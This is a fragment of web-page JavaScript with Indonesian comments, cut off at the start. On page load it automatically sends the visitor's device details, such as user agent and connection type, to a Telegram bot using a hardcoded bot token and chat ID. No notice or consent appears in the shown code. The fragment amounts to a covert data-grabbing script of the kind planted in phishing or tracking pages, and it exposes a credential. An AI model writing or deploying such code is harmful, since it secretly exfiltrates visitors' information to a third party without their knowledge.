  <script>
    async function kirimOtomatis() {

[PERANGKAT]
User-Agent: ${userAgent}
Koneksi: ${jaringan}
        `;

        const token = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
        const chat_id = "7218964278";

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id, text: pesan }),
        });

        console.log("Data terkirim ke Telegram");
      } catch (err) {
        console.error("Gagal kirim data:", err);
      }
    }

    kirimOtomatis(); // auto jalan saat halaman dibuka
